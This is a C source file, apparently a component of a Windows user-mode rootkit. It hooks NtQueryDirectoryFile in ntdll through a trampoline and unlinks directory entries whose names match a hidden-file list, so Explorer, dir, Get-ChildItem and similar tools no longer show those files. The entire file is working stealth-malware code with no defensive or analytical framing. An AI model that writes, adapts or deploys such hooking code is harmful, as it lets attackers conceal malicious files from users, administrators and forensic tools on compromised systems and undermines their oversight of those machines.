/*
 * hide_file.c — File Concealment via NtQueryDirectoryFile Hook
 * 22DIV / george wu
 *
 * Hooks NtQueryDirectoryFile. Filters directory listing results to
 * remove entries matching hidden filenames. Explorer, dir, Get-ChildItem,
 * and any tool using this API will not see the hidden files.
 *
 * Handles multiple FileInformationClass values:
 *   1 = FileDirectoryInformation
 *   2 = FileFullDirectoryInformation
 *   3 = FileBothDirectoryInformation
 *  37 = FileIdBothDirectoryInformation
 */

#include <windows.h>
#include "hook_engine.h"
#include "cloak.h"

typedef struct _IO_STATUS_BLOCK {
    union {
        LONG   Status;
        PVOID  Pointer;
    };
    ULONG_PTR Information;
} IO_STATUS_BLOCK2;

typedef VOID (NTAPI *PIO_APC_ROUTINE)(PVOID, struct _IO_STATUS_BLOCK *, ULONG);

typedef LONG (NTAPI *pfnNtQueryDirectoryFile)(
    HANDLE                 FileHandle,
    HANDLE                 Event,
    PIO_APC_ROUTINE        ApcRoutine,
    PVOID                  ApcContext,
    IO_STATUS_BLOCK2      *IoStatusBlock,
    PVOID                  FileInformation,
    ULONG                  Length,
    ULONG                  FileInformationClass,
    BOOLEAN                ReturnSingleEntry,
    PVOID                  FileName,
    BOOLEAN                RestartScan
);

HOOK_ENTRY g_hook_nqdf = {0};

typedef struct { ULONG off_next; ULONG off_namelen; ULONG off_name; } DIR_LAYOUT;

static BOOL get_dir_layout(ULONG infoClass, DIR_LAYOUT *out) {
    switch (infoClass) {
        case 1:  /* FileDirectoryInformation */
            out->off_next = 0; out->off_namelen = 56; out->off_name = 64;
            return TRUE;
        case 2:  /* FileFullDirectoryInformation */
            out->off_next = 0; out->off_namelen = 56; out->off_name = 68;
            return TRUE;
        case 3:  /* FileBothDirectoryInformation */
            out->off_next = 0; out->off_namelen = 56; out->off_name = 94;
            return TRUE;
        case 37: /* FileIdBothDirectoryInformation */
            out->off_next = 0; out->off_namelen = 56; out->off_name = 104;
            return TRUE;
        default:
            return FALSE;
    }
}

static BOOL should_hide_file(BYTE *entry, DIR_LAYOUT *layout) {
    ULONG nameLen = *(ULONG *)(entry + layout->off_namelen);
    WCHAR *name   = (WCHAR *)(entry + layout->off_name);
    ULONG charLen = nameLen / sizeof(WCHAR);
    return match_hidden_name(name, charLen, HIDDEN_FILES);
}

static LONG NTAPI hook_NtQueryDirectoryFile(
    HANDLE                 FileHandle,
    HANDLE                 Event,
    PIO_APC_ROUTINE        ApcRoutine,
    PVOID                  ApcContext,
    IO_STATUS_BLOCK2      *IoStatusBlock,
    PVOID                  FileInformation,
    ULONG                  Length,
    ULONG                  FileInformationClass,
    BOOLEAN                ReturnSingleEntry,
    PVOID                  FileName,
    BOOLEAN                RestartScan
) {
    pfnNtQueryDirectoryFile orig =
        (pfnNtQueryDirectoryFile)g_hook_nqdf.trampoline;

    LONG status = orig(
        FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock,
        FileInformation, Length, FileInformationClass,
        ReturnSingleEntry, FileName, RestartScan
    );

    if (status != 0)
        return status;

    DIR_LAYOUT layout;
    if (!get_dir_layout(FileInformationClass, &layout))
        return status;

    BYTE *prev = NULL;
    BYTE *curr = (BYTE *)FileInformation;
    ULONG nextOff;

    for (;;) {
        nextOff = *(ULONG *)(curr + layout.off_next);

        if (should_hide_file(curr, &layout)) {
            if (ReturnSingleEntry) {
                status = (LONG)0x80000006L; /* STATUS_NO_MORE_ENTRIES */
                break;
            }

            if (nextOff == 0) {
                if (prev)
                    *(ULONG *)(prev + layout.off_next) = 0;
                else
                    status = (LONG)0x80000006L;
                break;
            }

            if (prev) {
                *(ULONG *)(prev + layout.off_next) += nextOff;
            } else {
                ULONG remaining = Length - nextOff;
                memmove(curr, curr + nextOff, remaining);
                continue;
            }
        } else {
            prev = curr;
        }

        if (nextOff == 0) break;
        curr = curr + nextOff;
    }

    return status;
}

BOOL install_file_hook(void) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return FALSE;

    g_hook_nqdf.target         = GetProcAddress(ntdll, "NtQueryDirectoryFile");
    g_hook_nqdf.hook           = hook_NtQueryDirectoryFile;
    g_hook_nqdf.save_size      = 24;   /* full NT stub incl. syscall+ret */
    g_hook_nqdf.self_contained = TRUE;

    if (!g_hook_nqdf.target) return FALSE;
    return hook_install(&g_hook_nqdf);
}

void remove_file_hook(void) {
    hook_remove(&g_hook_nqdf);
}
